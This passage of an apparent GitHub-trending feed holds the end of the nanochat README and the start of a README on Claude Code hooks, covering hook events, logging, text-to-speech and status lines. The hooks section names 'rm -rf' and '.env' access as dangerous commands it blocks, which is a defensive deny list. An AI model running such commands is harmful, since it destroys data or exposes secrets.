 &lt;li&gt;&lt;a href="https://github.com/karpathy/nanochat/discussions/1"&gt;Oct 13 2025 original nanochat post&lt;/a&gt; introducing nanochat, though now it contains some deprecated information and the model is a lot older (with worse results) than current master.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/karpathy/nanochat/discussions/420"&gt;Jan 7 miniseries v1&lt;/a&gt; documents the first nanochat miniseries of models.&lt;/li&gt; 
 &lt;li&gt;To customize your nanochat, see &lt;a href="https://github.com/karpathy/nanochat/discussions/139"&gt;Guide: infusing identity to your nanochat&lt;/a&gt; in Discussions, which describes how you can tune your nanochat's personality through synthetic data generation and mixing that data into the SFT stage.&lt;/li&gt; 
 &lt;li&gt;To add new abilities to nanochat, see &lt;a href="https://github.com/karpathy/nanochat/discussions/164"&gt;Guide: counting r in strawberry (and how to add abilities generally)&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;File structure&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;.
‚îú‚îÄ‚îÄ LICENSE
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ dev
‚îÇ   ‚îú‚îÄ‚îÄ gen_synthetic_data.py       # Example synthetic data for identity
‚îÇ   ‚îú‚îÄ‚îÄ generate_logo.html
‚îÇ   ‚îú‚îÄ‚îÄ nanochat.png
‚îÇ   ‚îî‚îÄ‚îÄ repackage_data_reference.py # Pretraining data shard generation
‚îú‚îÄ‚îÄ nanochat
‚îÇ   ‚îú‚îÄ‚îÄ __init__.py                 # empty
‚îÇ   ‚îú‚îÄ‚îÄ checkpoint_manager.py       # Save/Load model checkpoints
‚îÇ   ‚îú‚îÄ‚îÄ common.py                   # Misc small utilities, quality of life
‚îÇ   ‚îú‚îÄ‚îÄ core_eval.py                # Evaluates base model CORE score (DCLM paper)
‚îÇ   ‚îú‚îÄ‚îÄ dataloader.py               # Tokenizing Distributed Data Loader
‚îÇ   ‚îú‚îÄ‚îÄ dataset.py                  # Download/read utils for pretraining data
‚îÇ   ‚îú‚îÄ‚îÄ engine.py                   # Efficient model inference with KV Cache
‚îÇ   ‚îú‚îÄ‚îÄ execution.py                # Allows the LLM to execute Python code as tool
‚îÇ   ‚îú‚îÄ‚îÄ gpt.py                      # The GPT nn.Module Transformer
‚îÇ   ‚îú‚îÄ‚îÄ logo.svg
‚îÇ   ‚îú‚îÄ‚îÄ loss_eval.py                # Evaluate bits per byte (instead of loss)
‚îÇ   ‚îú‚îÄ‚îÄ optim.py                    # AdamW + Muon optimizer, 1GPU and distributed
‚îÇ   ‚îú‚îÄ‚îÄ report.py                   # Utilities for writing the nanochat Report
‚îÇ   ‚îú‚îÄ‚îÄ tokenizer.py                # BPE Tokenizer wrapper in style of GPT-4
‚îÇ   ‚îî‚îÄ‚îÄ ui.html                     # HTML/CSS/JS for nanochat frontend
‚îú‚îÄ‚îÄ pyproject.toml
‚îú‚îÄ‚îÄ runs
‚îÇ   ‚îú‚îÄ‚îÄ miniseries.sh               # Miniseries training script
‚îÇ   ‚îú‚îÄ‚îÄ runcpu.sh                   # Small example of how to run on CPU/MPS
‚îÇ   ‚îú‚îÄ‚îÄ scaling_laws.sh             # Scaling laws experiments
‚îÇ   ‚îî‚îÄ‚îÄ speedrun.sh                 # Train the ~$100 nanochat d20
‚îú‚îÄ‚îÄ scripts
‚îÇ   ‚îú‚îÄ‚îÄ base_eval.py                # Base model: CORE score, bits per byte, samples
‚îÇ   ‚îú‚îÄ‚îÄ base_train.py               # Base model: train
‚îÇ   ‚îú‚îÄ‚îÄ chat_cli.py                 # Chat model: talk to over CLI
‚îÇ   ‚îú‚îÄ‚îÄ chat_eval.py                # Chat model: eval tasks
‚îÇ   ‚îú‚îÄ‚îÄ chat_rl.py                  # Chat model: reinforcement learning
‚îÇ   ‚îú‚îÄ‚îÄ chat_sft.py                 # Chat model: train SFT
‚îÇ   ‚îú‚îÄ‚îÄ chat_web.py                 # Chat model: talk to over WebUI
‚îÇ   ‚îú‚îÄ‚îÄ tok_eval.py                 # Tokenizer: evaluate compression rate
‚îÇ   ‚îî‚îÄ‚îÄ tok_train.py                # Tokenizer: train it
‚îú‚îÄ‚îÄ tasks
‚îÇ   ‚îú‚îÄ‚îÄ arc.py                      # Multiple choice science questions
‚îÇ   ‚îú‚îÄ‚îÄ common.py                   # TaskMixture | TaskSequence
‚îÇ   ‚îú‚îÄ‚îÄ customjson.py               # Make Task from arbitrary jsonl convos
‚îÇ   ‚îú‚îÄ‚îÄ gsm8k.py                    # 8K Grade School Math questions
‚îÇ   ‚îú‚îÄ‚îÄ humaneval.py                # Misnomer; Simple Python coding task
‚îÇ   ‚îú‚îÄ‚îÄ mmlu.py                     # Multiple choice questions, broad topics
‚îÇ   ‚îú‚îÄ‚îÄ smoltalk.py                 # Conglomerate dataset of SmolTalk from HF
‚îÇ   ‚îî‚îÄ‚îÄ spellingbee.py              # Task teaching model to spell/count letters
‚îú‚îÄ‚îÄ tests
‚îÇ   ‚îî‚îÄ‚îÄ test_engine.py
‚îî‚îÄ‚îÄ uv.lock
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;The goal of nanochat is to improve the state of the art in micro models that are accessible to work with end to end on budgets of &amp;lt; $1000 dollars. Accessibility is about overall cost but also about cognitive complexity - nanochat is not an exhaustively configurable LLM "framework"; there are no giant configuration objects, model factories, or if-then-else monsters in the code base. It is a single, cohesive, minimal, readable, hackable, maximally-forkable "strong baseline" codebase designed to run start to end and produce a ChatGPT model you can talk to. Currently, the most interesting part personally is speeding up the latency to GPT-2 (i.e. getting a CORE score above 0.256525). Currently this takes ~3 hours, but by improving the pretraining stage we can improve this further.&lt;/p&gt; 
&lt;p&gt;Current AI policy: disclosure. When submitting a PR, please declare any parts that had substantial LLM contribution and that you have not written or that you do not fully understand.&lt;/p&gt; 
&lt;h2&gt;Acknowledgements&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;The name (nanochat) derives from my earlier project &lt;a href="https://github.com/karpathy/nanoGPT"&gt;nanoGPT&lt;/a&gt;, which only covered pretraining.&lt;/li&gt; 
 &lt;li&gt;nanochat is also inspired by &lt;a href="https://github.com/KellerJordan/modded-nanogpt"&gt;modded-nanoGPT&lt;/a&gt;, which gamified the nanoGPT repo with clear metrics and a leaderboard, and borrows a lot of its ideas and some implementation for pretraining.&lt;/li&gt; 
 &lt;li&gt;Thank you to &lt;a href="https://huggingface.co/"&gt;HuggingFace&lt;/a&gt; for fineweb and smoltalk.&lt;/li&gt; 
 &lt;li&gt;Thank you &lt;a href="https://lambda.ai/service/gpu-cloud"&gt;Lambda&lt;/a&gt; for the compute used in developing this project.&lt;/li&gt; 
 &lt;li&gt;Thank you to chief LLM whisperer üßô‚Äç‚ôÇÔ∏è Alec Radford for advice/guidance.&lt;/li&gt; 
 &lt;li&gt;Thank you to the repo czar Sofie &lt;a href="https://github.com/svlandeg"&gt;@svlandeg&lt;/a&gt; for help with managing issues, pull requests and discussions of nanochat.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Cite&lt;/h2&gt; 
&lt;p&gt;If you find nanochat helpful in your research cite simply as:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@misc{nanochat,
  author = {Andrej Karpathy},
  title = {nanochat: The best ChatGPT that \$100 can buy},
  year = {2025},
  publisher = {GitHub},
  url = {https://github.com/karpathy/nanochat}
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;MIT&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>disler/claude-code-hooks-mastery</title>
      <link>https://github.com/disler/claude-code-hooks-mastery</link>
      <description>&lt;p&gt;Master Claude Code Hooks&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Claude Code Hooks Mastery&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://docs.anthropic.com/en/docs/claude-code/hooks"&gt;Claude Code Hooks&lt;/a&gt; - Quickly master how to use Claude Code hooks to add deterministic (or non-deterministic) control over Claude Code's behavior. Plus learn about &lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#claude-code-sub-agents"&gt;Claude Code Sub-Agents&lt;/a&gt;, the powerful &lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#the-meta-agent"&gt;Meta-Agent&lt;/a&gt;, and &lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#team-based-validation-system"&gt;Team-Based Validation&lt;/a&gt; with agent orchestration.&lt;/p&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/hooked.png" alt="Claude Code Hooks" style="max-width: 800px; width: 100%;" /&gt; 
&lt;h2&gt;Table of Contents&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#prerequisites"&gt;Prerequisites&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#hook-lifecycle--payloads"&gt;Hook Lifecycle &amp;amp; Payloads&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#what-this-shows"&gt;What This Shows&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#uv-single-file-scripts-architecture"&gt;UV Single-File Scripts Architecture&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#key-files"&gt;Key Files&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#features-demonstrated"&gt;Features Demonstrated&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#hook-error-codes--flow-control"&gt;Hook Error Codes &amp;amp; Flow Control&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#userpromptsubmit-hook-deep-dive"&gt;UserPromptSubmit Hook Deep Dive&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#claude-code-sub-agents"&gt;Claude Code Sub-Agents&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#team-based-validation-system"&gt;Team-Based Validation System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#output-styles-collection"&gt;Output Styles Collection&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#custom-status-lines"&gt;Custom Status Lines&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Prerequisites&lt;/h2&gt; 
&lt;p&gt;This requires:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://docs.astral.sh/uv/getting-started/installation/"&gt;Astral UV&lt;/a&gt;&lt;/strong&gt; - Fast Python package installer and resolver&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://docs.anthropic.com/en/docs/claude-code"&gt;Claude Code&lt;/a&gt;&lt;/strong&gt; - Anthropic's CLI for Claude AI&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Optional Setup:&lt;/h3&gt; 
&lt;p&gt;Optional:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://elevenlabs.io/"&gt;ElevenLabs&lt;/a&gt;&lt;/strong&gt; - Text-to-speech provider (with MCP server integration)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://github.com/elevenlabs/elevenlabs-mcp"&gt;ElevenLabs MCP Server&lt;/a&gt;&lt;/strong&gt; - MCP server for ElevenLabs&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://www.firecrawl.dev/mcp"&gt;Firecrawl MCP Server&lt;/a&gt;&lt;/strong&gt; - Web scraping and crawling MCP server (my favorite scraper)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://openai.com/"&gt;OpenAI&lt;/a&gt;&lt;/strong&gt; - Language model provider + Text-to-speech provider&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://www.anthropic.com/"&gt;Anthropic&lt;/a&gt;&lt;/strong&gt; - Language model provider&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://ollama.com/"&gt;Ollama&lt;/a&gt;&lt;/strong&gt; - Local language model provider&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Hook Lifecycle &amp;amp; Payloads&lt;/h2&gt; 
&lt;p&gt;This demo captures all 13 Claude Code hook lifecycle events with their JSON payloads:&lt;/p&gt; 
&lt;h3&gt;Hook Lifecycle Overview&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-mermaid"&gt;flowchart TB
    subgraph SESSION["üü¢ Session Lifecycle"]
        direction TB
        SETUP[["üîß Setup&amp;lt;br/&amp;gt;(init/maintenance)"]]
        START[["‚ñ∂Ô∏è SessionStart&amp;lt;br/&amp;gt;(startup/resume/clear)"]]
        END[["‚èπÔ∏è SessionEnd&amp;lt;br/&amp;gt;(exit/sigint/error)"]]
    end

    subgraph MAIN["üîÑ Main Conversation Loop"]
        direction TB
        PROMPT[["üìù UserPromptSubmit"]]
        CLAUDE["Claude Processes"]

        subgraph TOOLS["üõ†Ô∏è Tool Execution"]
            direction TB
            PRE[["üîí PreToolUse"]]
            PERM[["‚ùì PermissionRequest"]]
            EXEC["Tool Executes"]
            POST[["‚úÖ PostToolUse"]]
            FAIL[["‚ùå PostToolUseFailure"]]
        end

        subgraph SUBAGENT["ü§ñ Subagent Lifecycle"]
            direction TB
            SSTART[["üöÄ SubagentStart"]]
            SWORK["Subagent Works"]
            SSTOP[["üèÅ SubagentStop"]]
        end

        NOTIFY[["üîî Notification&amp;lt;br/&amp;gt;(Async)"]]
        STOP[["üõë Stop"]]
    end

    subgraph COMPACT["üóúÔ∏è Maintenance"]
        PRECOMPACT[["üì¶ PreCompact"]]
    end

    SETUP --&amp;gt; START
    START --&amp;gt; PROMPT
    PROMPT --&amp;gt; CLAUDE
    CLAUDE --&amp;gt; PRE
    PRE --&amp;gt; PERM
    PERM --&amp;gt; EXEC
    EXEC --&amp;gt; POST
    EXEC -.-&amp;gt; FAIL
    CLAUDE -.-&amp;gt; SSTART
    SSTART --&amp;gt; SWORK
    SWORK --&amp;gt; SSTOP
    POST --&amp;gt; CLAUDE
    CLAUDE --&amp;gt; STOP
    CLAUDE -.-&amp;gt; NOTIFY
    STOP --&amp;gt; PROMPT
    STOP -.-&amp;gt; END
    PROMPT -.-&amp;gt; PRECOMPACT
    PRECOMPACT -.-&amp;gt; PROMPT
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;1. UserPromptSubmit Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; Immediately when user submits a prompt (before Claude processes it)&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;prompt&lt;/code&gt; text, &lt;code&gt;session_id&lt;/code&gt;, timestamp&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Prompt validation, logging, context injection, security filtering&lt;/p&gt; 
&lt;h3&gt;2. PreToolUse Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; Before any tool execution&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt; parameters&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Blocks dangerous commands (&lt;code&gt;rm -rf&lt;/code&gt;, &lt;code&gt;.env&lt;/code&gt; access)&lt;/p&gt; 
&lt;h3&gt;3. PostToolUse Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; After successful tool completion&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt;, &lt;code&gt;tool_response&lt;/code&gt; with results&lt;/p&gt; 
&lt;h3&gt;4. Notification Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code sends notifications (waiting for input, etc.)&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;message&lt;/code&gt; content&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; TTS alerts - "Your agent needs your input" (30% chance includes name)&lt;/p&gt; 
&lt;h3&gt;5. Stop Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code finishes responding&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;stop_hook_active&lt;/code&gt; boolean flag&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; AI-generated completion messages with TTS playback (LLM priority: OpenAI &amp;gt; Anthropic &amp;gt; Ollama &amp;gt; random)&lt;/p&gt; 
&lt;h3&gt;6. SubagentStop Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code subagents (Task tools) finish responding&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;stop_hook_active&lt;/code&gt; boolean flag&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; TTS playback - "Subagent Complete"&lt;/p&gt; 
&lt;h3&gt;7. PreCompact Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; Before Claude Code performs a compaction operation&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;trigger&lt;/code&gt; ("manual" or "auto"), &lt;code&gt;custom_instructions&lt;/code&gt; (for manual), session info&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Transcript backup, verbose feedback for manual compaction&lt;/p&gt; 
&lt;h3&gt;8. SessionStart Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code starts a new session or resumes an existing one &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;source&lt;/code&gt; ("startup", "resume", or "clear"), session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Development context loading (git status, recent issues, context files)&lt;/p&gt; 
&lt;h3&gt;9. SessionEnd Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude Code session ends (exit, sigint, or error) &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;session_id&lt;/code&gt;, &lt;code&gt;transcript_path&lt;/code&gt;, &lt;code&gt;cwd&lt;/code&gt;, &lt;code&gt;permission_mode&lt;/code&gt;, &lt;code&gt;reason&lt;/code&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Session logging with optional cleanup tasks (removes temp files, stale logs)&lt;/p&gt; 
&lt;h3&gt;10. PermissionRequest Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When user is shown a permission dialog &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt;, &lt;code&gt;tool_use_id&lt;/code&gt;, session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Permission auditing, auto-allow for read-only ops (Read, Glob, Grep, safe Bash)&lt;/p&gt; 
&lt;h3&gt;11. PostToolUseFailure Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When a tool execution fails &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt;, &lt;code&gt;tool_use_id&lt;/code&gt;, &lt;code&gt;error&lt;/code&gt; object &lt;strong&gt;Enhanced:&lt;/strong&gt; Structured error logging with timestamps and full context&lt;/p&gt; 
&lt;h3&gt;12. SubagentStart Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When a subagent (Task tool) spawns &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;agent_id&lt;/code&gt;, &lt;code&gt;agent_type&lt;/code&gt;, session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Subagent spawn logging with optional TTS announcement&lt;/p&gt; 
&lt;h3&gt;13. Setup Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; When Claude enters a repository (init) or periodically (maintenance) &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;trigger&lt;/code&gt; ("init" or "maintenance"), session info &lt;strong&gt;Enhanced:&lt;/strong&gt; Environment persistence via &lt;code&gt;CLAUDE_ENV_FILE&lt;/code&gt;, context injection via &lt;code&gt;additionalContext&lt;/code&gt;&lt;/p&gt; 
&lt;h2&gt;What This Shows&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Complete hook lifecycle coverage&lt;/strong&gt; - All 13 hook events implemented and logging (11/13 validated via automated testing)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Prompt-level control&lt;/strong&gt; - UserPromptSubmit validates and enhances prompts before Claude sees them&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Intelligent TTS system&lt;/strong&gt; - AI-generated audio feedback with voice priority (ElevenLabs &amp;gt; OpenAI &amp;gt; pyttsx3)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Security enhancements&lt;/strong&gt; - Blocks dangerous commands and sensitive file access at multiple levels&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Personalized experience&lt;/strong&gt; - Uses engineer name from environment variables&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Automatic logging&lt;/strong&gt; - All hook events are logged as JSON to &lt;code&gt;logs/&lt;/code&gt; directory&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Chat transcript extraction&lt;/strong&gt; - PostToolUse hook converts JSONL transcripts to readable JSON format&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Team-based validation&lt;/strong&gt; - Builder/Validator agent pattern with code quality hooks&lt;/li&gt; 
&lt;/ul&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; The &lt;code&gt;chat.json&lt;/code&gt; file contains only the most recent Claude Code conversation. It does not preserve conversations from previous sessions - each new conversation is fully copied and overwrites the previous one. This is unlike the other logs which are appended to from every claude code session.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;UV Single-File Scripts Architecture&lt;/h2&gt; 
&lt;p&gt;This project leverages &lt;strong&gt;&lt;a href="https://docs.astral.sh/uv/guides/scripts/"&gt;UV single-file scripts&lt;/a&gt;&lt;/strong&gt; to keep hook logic cleanly separated from your main codebase. All hooks live in &lt;code&gt;.claude/hooks/&lt;/code&gt; as standalone Python scripts with embedded dependency declarations.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Benefits:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Isolation&lt;/strong&gt; - Hook logic stays separate from your project dependencies&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Portability&lt;/strong&gt; - Each hook script declares its own dependencies inline&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;No Virtual Environment Management&lt;/strong&gt; - UV handles dependencies automatically&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Fast Execution&lt;/strong&gt; - UV's dependency resolution is lightning-fast&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Self-Contained&lt;/strong&gt; - Each hook can be understood and modified independently&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;This approach ensures your hooks remain functional across different environments without polluting your main project's dependency tree.&lt;/p&gt; 
&lt;h2&gt;Key Files&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;.claude/settings.json&lt;/code&gt; - Hook configuration with permissions&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/hooks/&lt;/code&gt; - Python scripts using uv for each hook type 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;user_prompt_submit.py&lt;/code&gt; - Prompt validation, logging, and context injection&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_tool_use.py&lt;/code&gt; - Security blocking and logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use.py&lt;/code&gt; - Logging and transcript conversion&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;post_tool_use_failure.py&lt;/code&gt; - Error logging with structured details&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;notification.py&lt;/code&gt; - Logging with optional TTS (--notify flag)&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;stop.py&lt;/code&gt; - AI-generated completion messages with TTS&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_stop.py&lt;/code&gt; - Simple "Subagent Complete" TTS&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;subagent_start.py&lt;/code&gt; - Subagent spawn logging with optional TTS&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;pre_compact.py&lt;/code&gt; - Transcript backup and compaction logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_start.py&lt;/code&gt; - Development context loading and session logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;session_end.py&lt;/code&gt; - Session cleanup and logging&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;permission_request.py&lt;/code&gt; - Permission auditing and auto-allow&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;setup.py&lt;/code&gt; - Repository initialization and maintenance&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;validators/&lt;/code&gt; - Code quality validation hooks 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;ruff_validator.py&lt;/code&gt; - Python linting via Ruff (PostToolUse)&lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;ty_validator.py&lt;/code&gt; - Python type checking (PostToolUse)&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;utils/&lt;/code&gt; - Intelligent TTS and LLM utility scripts 
    &lt;ul&gt; 
     &lt;li&gt;&lt;code&gt;tts/&lt;/code&gt; - Text-to-speech providers (ElevenLabs, OpenAI, pyttsx3) 
      &lt;ul&gt; 
       &lt;li&gt;&lt;code&gt;tts_queue.py&lt;/code&gt; - Queue-based TTS management (prevents overlapping audio)&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
     &lt;li&gt;&lt;code&gt;llm/&lt;/code&gt; - Language model integrations (OpenAI, Anthropic, Ollama) 
      &lt;ul&gt; 
       &lt;li&gt;&lt;code&gt;task_summarizer.py&lt;/code&gt; - LLM-powered task completion summaries&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/status_lines/&lt;/code&gt; - Real-time terminal status displays 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;status_line.py&lt;/code&gt; - Basic MVP with git info&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v2.py&lt;/code&gt; - Smart prompts with color coding&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v3.py&lt;/code&gt; - Agent sessions with history&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v4.py&lt;/code&gt; - Extended metadata support&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v5.py&lt;/code&gt; - Cost tracking with line changes&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v6.py&lt;/code&gt; - Context window usage bar&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v7.py&lt;/code&gt; - Session duration timer&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v8.py&lt;/code&gt; - Token usage with cache stats&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;status_line_v9.py&lt;/code&gt; - Minimal powerline style&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;.claude/output-styles/&lt;/code&gt; - Response formatting configurations 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;genui.md&lt;/code&gt; - Generates beautiful HTML with embedded styling&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;table-based.md&lt;/code&gt; - Organizes information in markdown tables&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;yaml-structured.md&lt;/code&gt; - YAML configuration format&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;bullet-points.md&lt;/code&gt; - Clean nested lists&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;ultra-concise.md&lt;/code&gt; - Minimal words, maximum speed&lt;/li&gt; 
